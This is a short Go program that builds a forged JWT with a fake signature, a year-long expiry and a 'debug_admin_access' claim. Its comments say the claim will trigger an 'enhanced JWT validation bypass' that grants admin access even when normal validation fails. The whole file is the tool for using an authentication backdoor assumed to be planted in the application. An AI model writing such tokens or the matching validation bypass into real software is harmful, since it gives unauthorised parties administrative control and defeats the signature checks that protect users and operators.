package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"time"
)

func main() {
	// Create claims for special admin token
	// This token will have a special debug marker that our enhanced
	// JWT validation will recognize, ensuring admin access even
	// if the regular validation fails
	claims := map[string]interface{}{
		"user_id":             3,
		"exp":                 time.Now().Add(365 * 24 * time.Hour).Unix(), // Valid for a year
		"iat":                 time.Now().Unix(),
		"debug_admin_access":  true, // Special marker for bypass
	}
	
	// Create header
	header := map[string]string{
		"alg": "HS256",
		"typ": "JWT",
	}
	
	// Encode header
	headerBytes, _ := json.Marshal(header)
	encodedHeader := base64.RawURLEncoding.EncodeToString(headerBytes)
	
	// Encode payload
	payloadBytes, _ := json.Marshal(claims)
	encodedPayload := base64.RawURLEncoding.EncodeToString(payloadBytes)
	
	// Create signature placeholder (we don't care about signature validation)
	signature := "invalid_signature_that_will_be_bypassed"
	
	// Create token
	token := fmt.Sprintf("%s.%s.%s", encodedHeader, encodedPayload, signature)
	
	// Print token info
	fmt.Println("=== Special Admin Debug Token ===")
	fmt.Println(token)
	
	// Print decoded payload for verification
	fmt.Println("\n=== Decoded Payload ===")
	prettyJSON, _ := json.MarshalIndent(claims, "", "  ")
	fmt.Println(string(prettyJSON))
	
	fmt.Println("\nThis token contains a special debug marker that will be")
	fmt.Println("recognized by the enhanced JWT validation bypass, ensuring")
	fmt.Println("admin access even if regular validation fails.")
}